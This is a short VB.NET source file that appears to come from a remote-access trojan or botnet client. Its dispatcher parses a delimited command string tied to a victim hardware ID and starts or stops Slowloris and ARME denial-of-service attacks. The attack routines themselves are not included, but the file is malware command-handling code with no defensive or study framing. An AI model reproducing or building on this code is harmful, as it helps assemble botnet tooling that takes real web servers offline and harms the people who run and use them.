Public Class Main
    Public Shared HWID

    Public Shared Sub MISC(ByVal HW As String, ByVal CMD As String)
        On Error Resume Next

        Dim A As String() = Split(CMD, "|'P'|")
        HWID = HW
        Select Case A(0)

            Case "Slowloris"
                Select Case A(1)
                    Case "1"
                        STV("Slowloris|STOP", "False")
                        Slowloris.StartSlowloris(A(2), A(3), A(4), A(5))
                    Case "2"
                        STV("Slowloris|STOP", "True")
                End Select

            Case "ARME"
                Select Case A(1)
                    Case "1"
                        STV("ARME|STOP", "False")
                        ARME.StartARME(A(2), A(3), A(4), A(5))
                    Case "2"
                        STV("ARME|STOP", "True")
                End Select
        End Select

    End Sub

End Class
